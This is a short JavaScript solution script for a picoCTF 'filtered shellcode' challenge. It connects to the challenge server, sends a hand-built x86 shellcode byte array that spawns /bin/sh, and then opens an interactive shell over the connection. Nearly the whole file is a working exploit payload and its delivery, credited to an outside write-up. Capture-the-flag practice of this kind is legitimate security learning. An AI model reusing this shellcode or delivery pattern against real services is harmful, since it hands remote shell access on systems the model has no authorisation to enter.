import nc from "../nc.js";
import { shell } from "../util.js";

const cat = new nc("nc mercury.picoctf.net 35338");

// used this guy's shellcode https://cyb3rwhitesnake.medium.com/picoctf-filtered-shellcode-pwn-3d69010376df
const SHELLCODE = [
    0x31, 0xC0, 0xB0, 0x0B, 0x31,
    0xC9, 0x31, 0xD2, 0x31, 0xDB,
    0xB3, 0x68, 0xD1, 0xE3, 0xD1,
    0xE3, 0xD1, 0xE3, 0xD1, 0xE3,
    0xD1, 0xE3, 0xD1, 0xE3, 0xD1,
    0xE3, 0xD1, 0xE3, 0xD1, 0xE3,
    0xD1, 0xE3, 0xD1, 0xE3, 0xD1,
    0xE3, 0xD1, 0xE3, 0xD1, 0xE3,
    0xD1, 0xE3, 0xD1, 0xE3, 0xB7,
    0x73, 0xB3, 0x2F, 0x53, 0x90,
    0xB7, 0x6E, 0xB3, 0x69, 0xD1,
    0xE3, 0xD1, 0xE3, 0xD1, 0xE3,
    0xD1, 0xE3, 0xD1, 0xE3, 0xD1,
    0xE3, 0xD1, 0xE3, 0xD1, 0xE3,
    0xD1, 0xE3, 0xD1, 0xE3, 0xD1,
    0xE3, 0xD1, 0xE3, 0xD1, 0xE3,
    0xD1, 0xE3, 0xD1, 0xE3, 0xD1,
    0xE3, 0xB7, 0x62, 0xB3, 0x2F,
    0x53, 0x90, 0x89, 0xE3, 0xCD,
    0x80
];
await cat.open;
await cat.readUntil("Give me code to run:")
await cat.write(Buffer.from(SHELLCODE));
await cat.write("\n");

shell(cat);